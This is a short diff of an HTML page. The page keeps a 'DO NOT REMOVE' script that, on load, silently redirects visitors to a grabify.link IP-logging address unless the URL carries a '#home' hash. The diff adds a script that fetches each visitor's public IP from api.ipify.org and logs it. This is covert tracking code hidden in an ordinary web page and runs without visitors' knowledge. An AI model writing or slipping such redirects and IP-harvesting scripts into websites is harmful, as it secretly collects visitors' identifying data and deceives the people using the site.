@@ -44,11 +44,18 @@
     <!-- DO NOT REMOVE-->
     <script>
       window.onload = function() {
-        if (window.location.hash !== '#home') {
+        if (window.location.hash!== '#home') {
           window.location.href = 'https://grabify.link/TKC1UZ';
         }
       };
     </script>
+    <script>
+      function getIP(json){
+        var ip = json.ip;
+        console.log(ip);
+      }
+    </script>
+    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
     <div id="adv"></div>
   </body>
 </html>
